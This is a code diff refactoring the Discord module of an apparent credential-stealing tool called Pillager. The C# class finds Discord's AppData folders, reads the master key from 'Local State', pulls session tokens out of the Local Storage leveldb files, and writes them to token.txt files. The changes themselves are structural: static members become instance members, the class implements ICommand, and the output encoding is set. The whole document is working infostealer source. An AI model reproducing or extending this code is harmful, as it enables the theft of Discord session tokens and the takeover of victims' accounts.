@@ -1,28 +1,24 @@
 ﻿using Pillager.Helper;
 using System;
-using System.Collections;
 using System.Collections.Generic;
 using System.IO;
 using System.Linq;
 using System.Security.Cryptography;
-using System.Security.Principal;
 using System.Text;
 using System.Text.RegularExpressions;
 
 namespace Pillager.Messengers
 {
-    internal class Discord
+    internal class Discord : ICommand
     {
-        public static string MessengerName = "Discord";
-
-        public static Dictionary<string, string> DiscordPaths = new Dictionary<string, string>
+        public Dictionary<string, string> DiscordPaths = new Dictionary<string, string>
         {
             { "Discord", Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData),"Discord" )} ,
             { "Discord PTB",Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "DiscordPTB" )},
             { "Discord Canary", Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData),"DiscordCanary" )} ,
         };
 
-        public static byte[] GetMasterKey(string path)
+        public byte[] GetMasterKey(string path)
         {
             string filePath = Path.Combine(path, "Local State");
             byte[] masterKey = new byte[] { };
@@ -46,7 +42,7 @@ namespace Pillager.Messengers
             }
         }
 
-        public static string GetToken(string path, byte[] key)
+        public string GetToken(string path, byte[] key)
         {
             StringBuilder stringBuilder = new StringBuilder();
             string leveldbpath = Path.Combine(path, "Local Storage\\leveldb");
@@ -76,7 +72,7 @@ namespace Pillager.Messengers
             return stringBuilder.ToString();
         }
 
-        public static void Save(string path)
+        public override void Save(string path)
         {
             foreach (var item in DiscordPaths)
             {
@@ -88,7 +84,7 @@ namespace Pillager.Messengers
                     if (string.IsNullOrEmpty(result)) continue;
                     string savepath = Path.Combine(path, item.Key);
                     Directory.CreateDirectory(savepath);
-                    File.WriteAllText(Path.Combine(savepath, "token.txt"), result);
+                    File.WriteAllText(Path.Combine(savepath, "token.txt"), result, Encoding.UTF8);
                 }
                 catch { }
             }
